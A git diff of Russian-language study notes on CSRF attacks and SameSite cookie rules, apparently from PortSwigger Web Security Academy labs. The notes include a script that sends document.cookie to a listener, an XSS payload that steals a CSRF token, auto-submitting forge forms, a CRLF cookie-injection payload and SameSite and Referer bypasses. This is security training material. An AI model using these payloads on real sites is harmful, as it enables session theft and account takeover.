@@ -4,9 +4,36 @@ CSRF атака возможна, если допущены ошибки в ме
 
 ![[Pasted image 20250113212910.png]]
 
+---
+
+## Разница Site и Origin
+
+![[Pasted image 20250114182435.png]]
+![[Pasted image 20250114182521.png]]
+
+---
+## Какими бывают Cookie - SameSite
+
+>**SameSite** - механизм безопасности браузера, который определяет, когда cookie веб-сайта включаются в запросы, исходящие от других веб-сайтов. Ограничения cookie SameSite обеспечивают частичную защиту от различных межсайтовых атак, включая CSRF, межсайтовые утечки и некоторые эксплойты CORS.
+
+|                           |                                |                       |                            |
+| ------------------------- | ------------------------------ | --------------------- | -------------------------- |
+| **Request from**          | **Request to**                 | **Same-site?**        | **Same-origin?**           |
+| `https://example.com`     | `https://example.com`          | Yes                   | Yes                        |
+| `https://app.example.com` | `https://intranet.example.com` | Yes                   | No: mismatched domain name |
+| `https://example.com`     | `https://example.com:8080`     | Yes                   | No: mismatched port        |
+| `https://example.com`     | `https://example.co.uk`        | No: mismatched eTLD   | No: mismatched domain name |
+| `https://example.com`     | `http://example.com`           | No: mismatched scheme | No: mismatched scheme      |
+![[SameSite ограничения.png]]
+![[SameSite strict.png]]
+
+
+---
+
 # Exploiting cross-site scripting to steal cookies
 
 [PayloadsAllTheThings - XSS - data-grabber-for-xs](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss)
+
 Пример в CORS: 
 ```javascript
 <script>
@@ -47,8 +74,13 @@ if __name__ == '__main__':
 ```javascript
 <iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: document.cookie, headers: { 'Content-Type': 'text/plain' }});" style="display: none;">
 ```
+
+---
+
 # CSRF без всякой защиты (use exploit server)
+
 https://portswigger.net/web-security/csrf/lab-no-defenses
+
 Repeater -> Engagement tools -> Generate CSRF PoC 
 ```html
 <html>
@@ -66,7 +98,11 @@ Repeater -> Engagement tools -> Generate CSRF PoC
 </html>
 
 ```
+
+---
 # CSRF уязвимости токена
+
+---
 
 ## Exploiting XSS to perform CSRF
 **Пользователь**, зашедший на страницу с **xss**, направит запрос и свой **csrf токен** на смену **email** на **'/my-account/change-email'**, если **токен** висит в **html**.
@@ -84,8 +120,12 @@ changeReq.send('csrf='+token+'&email=test@test.com')
 };  
 </script>
 ```
+
+---
 ## CSRF, когда проверка токена зависит от метода запроса (use exploit server)
+
 https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method
+
 1. Repeater -> Change request method
 2. Repeater -> Engagement tools -> Generate CSRF PoC
 ```html
@@ -103,19 +143,34 @@ https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-v
   </body>
 </html>
 ```
+
+---
+
 ## CSRF, когда проверка токена зависит от его наличия (use exploit server)
+
 https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present
+
 just delete csrf token.
 1. Repeater -> Change request method
 2. Repeater -> Engagement tools -> Generate CSRF PoC
+
+---
+
 ## CSRF, когда токен не привязан к сессии пользователя (use exploit server)
+
 https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session
+
 Использовать свой токен в эксплойте на сервере
 1. Proxy -> Intercept -> Intercept is off (to on) -> go to repeter
 2. Repeater -> Engagement tools -> Generate CSRF PoC
+
+---
 ## CSRF, когда токен привязан к не сеансовому cookie или дублирует не сеансовый cookie
+
 https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie
+
 https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie
+
 Нужно в форме подвязать свои не сеансовые cookie. Это возможно, если найти пользовательский input, который недостаточно валидирован и передаёт своё значение в header ответа. 
 
 Пусть существует возможность сделать поисковый запрос на сайте:
@@ -150,22 +205,14 @@ Cookie: csrfKey=LAKDqGn6ShUWMc54eSO2ZV176pPOh7Fi; session=fZSQ6mf9BoFyRGfEoI4q9W
 $FORM
 <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()" />
 ```
-# SameSite cookie
->**SameSite** - механизм безопасности браузера, который определяет, когда cookie веб-сайта включаются в запросы, исходящие от других веб-сайтов. Ограничения cookie SameSite обеспечивают частичную защиту от различных межсайтовых атак, включая CSRF, межсайтовые утечки и некоторые эксплойти CORS.
-![[SameSite and Origin.png]]
 
-|   |   |   |   |
-|---|---|---|---|
-|**Request from**|**Request to**|**Same-site?**|**Same-origin?**|
-|`https://example.com`|`https://example.com`|Yes|Yes|
-|`https://app.example.com`|`https://intranet.example.com`|Yes|No: mismatched domain name|
-|`https://example.com`|`https://example.com:8080`|Yes|No: mismatched port|
-|`https://example.com`|`https://example.co.uk`|No: mismatched eTLD|No: mismatched domain name|
-|`https://example.com`|`http://example.com`|No: mismatched scheme|No: mismatched scheme|
-![[SameSite ограничения.png]]
-![[SameSite strict.png]]
+---
+
+---
 ## Обход SameSite Lax через переопределение метода (use exploit server)
+
 https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override
+
 Может быть полезным Burp расширение: `Param Miner`.
 
 Сначала пробуем переопределить метод запроса с POST на GET:
@@ -177,8 +224,12 @@ https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-sa
 document.location="https://{site.com}/change-email?email=q%40q.q&_method=POST"
 </script>
 ```
+
+---
 ## Обход SameSite Lax через обновление cookie (use exploit server)
+
 https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
+
 Cookies с ограничениями Lax SameSite обычно не отправляются в межсайтовых POST-запросах, но есть и исключения.  
   
 Если веб-сайт не включает атрибут SameSite при установке cookie, Chrome автоматически применяет ограничения Lax по умолчанию. Однако, чтобы не нарушать механизмы единой авторизации (SSO), он не применяет эти ограничения в течение первых 120 секунд для POST-запросов верхнего уровня. В результате в течение двух минут пользователи могут быть подвержены межсайтовым атакам.
@@ -201,8 +252,12 @@ $FORM
 </script>
 ```
 
+---
+
 ## SameSite Strict - перенаправление на стороне клиента (use exploit server)
+
 https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect
+
 Допустим на сайте есть скрипт:
 ```javascript
 redirectOnConfirmation = (blogPath) => {
@@ -225,6 +280,7 @@ GET /site.com/?postId=../../../{маршрут на смену email}
 ```
 По сути нужно лишь проэксплуатировать open redirect, если он есть на сайте.
 
+---
 ## SameSite Strict через дочерний домен ([cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) ([CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)))
 https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
 Допустим есть сервер с живым чатом, использующий веб-сокеты для загрузки контента даже неавторизованного пользователя. Можно открыть CSRF соединение искусственно на своём explit сервере:
@@ -244,6 +300,7 @@ ws.onmessage = function(event) {
 https://cms-0ae4007f048e205982bcbfed00bc0073.web-security-academy.net/login?username=%3Cscript%3E{here code upper}%3C/script%3E&password=q
 ```
 
+---
 # Валидация заголовка Refere
 
 ## CSRF, когда проверка Referer зависит от наличия заголовка
@@ -251,6 +308,8 @@ https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-r
 1. Если убрать заголовок Referer, то возможно, что уязвимость проэксплуатируется.
 2. Repeater -> Engagement tools -> Generate CSRF PoC
 3. Добавляет тег `<meta name="referrer" content="no-referrer">`
+
+---
 
 ## CSRF с нарушенной проверкой Referer
 https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken
